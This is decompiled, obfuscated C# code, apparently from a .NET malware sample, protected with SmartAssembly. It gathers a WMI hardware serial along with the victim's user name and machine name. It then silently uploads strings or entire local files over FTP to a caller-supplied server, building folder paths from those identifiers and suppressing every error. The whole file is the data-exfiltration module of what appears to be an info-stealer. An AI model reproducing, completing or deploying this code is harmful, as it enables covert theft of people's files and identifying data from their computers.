using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace vlFwgXmbIo;

internal sealed class vnvqegDZgMFTThUQ
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string AEfbHcWBmhiPBNq()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107404666));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107404677)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = getString_0(107404628);
			ManagementObject val3 = new ManagementObject(getString_0(107404623) + text2 + getString_0(107404614));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107404609)).ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? getString_0(107391961) : text;
		}
	}

	public static void rpAwBKAwCZdJca(string xrNsmHSOkpZ = "URL", string iJbIuADkJAy = "USERNAME", string QitwvmTQiqJ = "ACCESO", string CMlpalNQDasLR = "")
	{
		try
		{
			string text = AEfbHcWBmhiPBNq();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(xrNsmHSOkpZ + getString_0(107406289) + Environment.UserName + getString_0(107406308) + Environment.MachineName + getString_0(107405743) + text + getString_0(107405770));
			ftpWebRequest.Method = getString_0(107404584);
			ftpWebRequest.Credentials = new NetworkCredential(iJbIuADkJAy, QitwvmTQiqJ);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(CMlpalNQDasLR);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void EtLrisjAZLbg(string YTPAteUJyncqNEG = "URL", string hKDELUIpSIfD = "USERNAME", string FAPfAfdxXqILSI = "ACCESO", string IyWcGQFCbNHac = "")
	{
		try
		{
			string text = AEfbHcWBmhiPBNq();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(YTPAteUJyncqNEG + getString_0(107406289) + Environment.UserName + getString_0(107406308) + Environment.MachineName + getString_0(107405743) + text + getString_0(107405743) + Path.GetFileName(IyWcGQFCbNHac));
			ftpWebRequest.Method = getString_0(107404584);
			ftpWebRequest.Credentials = new NetworkCredential(hKDELUIpSIfD, FAPfAfdxXqILSI);
			byte[] array = File.ReadAllBytes(IyWcGQFCbNHac);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static vnvqegDZgMFTThUQ()
	{
		Strings.CreateGetStringDelegate(typeof(vnvqegDZgMFTThUQ));
	}
}
